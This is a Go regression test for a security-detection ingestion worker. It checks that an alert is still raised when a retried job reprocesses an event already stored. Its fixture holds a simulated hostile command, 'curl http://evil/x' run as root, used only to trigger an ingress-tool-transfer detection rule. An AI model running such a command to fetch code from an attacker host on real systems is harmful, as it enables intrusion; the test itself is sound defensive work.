package ingestion

// Regression for the HIGH silent-detection-loss (reviewer, Jul 16 2026): process() used to skip detection when the
// event already existed (inserted==0), as an at-least-once optimization. But Append commits the event in its own
// tx, so if a LATER step failed and the job retried, the re-run re-Appended → inserted==0 → detection was skipped
// FOREVER: a real event stored with NO alert, the job reporting Complete. This test reproduces exactly that shape —
// an event that already exists reaching process again — and asserts detection STILL fires.
//
// The mutation check: restore the `if inserted == 0 { return nil }` short-circuit in worker.go and
// TestDetectRunsWhenEventAlreadyExists goes red (no alert on the second pass).

import (
	"context"
	"encoding/json"
	"log/slog"
	"testing"

	"github.com/google/uuid"
	"github.com/jackc/pgx/v5"

	"github.com/ArowuTest/nirvet/internal/alert"
	"github.com/ArowuTest/nirvet/internal/detection"
	"github.com/ArowuTest/nirvet/internal/platform/database"
	"github.com/ArowuTest/nirvet/internal/platform/eventstore"
	"github.com/ArowuTest/nirvet/internal/platform/queue"
	"github.com/ArowuTest/nirvet/internal/platform/testsupport"
	"github.com/ArowuTest/nirvet/internal/tenant"
)

func TestDetectRunsWhenEventAlreadyExists(t *testing.T) {
	db, err := database.Connect(context.Background(), testsupport.RequireDSN(t))
	if err != nil {
		t.Fatalf("connect: %v", err)
	}
	t.Cleanup(db.Close)
	ctx := context.Background()
	tn, err := tenant.NewService(tenant.NewRepository(db)).Create(ctx, tenant.CreateInput{Name: "detect-retry-" + uuid.NewString()})
	if err != nil {
		t.Fatalf("tenant: %v", err)
	}

	alertSvc := alert.NewService(alert.NewRepository(db))
	wk := NewWorker(nil, eventstore.NewPostgres(db), nil,
		detection.NewEngine(detection.NewRepository(db)), alertSvc, slog.Default())

	// An osquery process running curl → fires the seeded "Host: ingress tool transfer" rule (migration 0069).
	// A STABLE dedupe key is the whole point: it is what makes the second process() see inserted==0, and what the
	// alert is keyed on, so the two passes address the same event and the same alert.
	nj := normalizeJob{
		RawID:     uuid.New(),
		DedupeKey: "detect-retry-" + uuid.NewString(),
		Checksum:  "sum",
		Input: IngestInput{Source: "host_osquery", Data: map[string]any{
			"name": "process_events", "hostIdentifier": "web-01",
			"columns": map[string]any{"path": "/usr/bin/curl", "cmdline": "curl http://evil/x", "pid": "1", "username": "root"},
		}},
	}
	payload, _ := json.Marshal(nj)
	job := queue.Job{ID: uuid.New(), TenantID: tn.ID, Kind: "normalize", Payload: payload}

	// Pass 1: the genuinely-new event → detection runs → the alert is raised.
	if err := wk.process(ctx, job); err != nil {
		t.Fatalf("pass 1 process: %v", err)
	}
	after1, err := alertSvc.List(ctx, tn.ID, "")
	if err != nil {
		t.Fatalf("list after pass 1: %v", err)
	}
	if len(after1) == 0 {
		t.Fatal("pass 1 raised no alert — the seeded detection did not fire; test precondition broken")
	}

	// Simulate the failure the bug hinges on: the event committed, but detection did NOT complete the first time
	// (a transient error / crash between append and the alert insert). We model that by removing the alert, leaving
	// the event in place — exactly the state a crash-after-append would leave.
	if err := db.WithTenant(ctx, tn.ID, func(ctx context.Context, tx pgx.Tx) error {
		_, e := tx.Exec(ctx, `DELETE FROM alerts WHERE tenant_id = $1`, tn.ID)
		return e
	}); err != nil {
		t.Fatalf("delete alert: %v", err)
	}

	// Pass 2: the SAME event reaches process again (job retry). Append now returns inserted==0. The fix requires
	// detection to run anyway and re-raise the alert. Under the old short-circuit, this pass raised nothing.
	if err := wk.process(ctx, job); err != nil {
		t.Fatalf("pass 2 process: %v", err)
	}
	after2, err := alertSvc.List(ctx, tn.ID, "")
	if err != nil {
		t.Fatalf("list after pass 2: %v", err)
	}
	if len(after2) == 0 {
		t.Fatal("pass 2 raised NO alert on an already-existing event — detection was skipped. This is the HIGH " +
			"silent-detection-loss: an event stored with no alert while the job reports Complete.")
	}
}
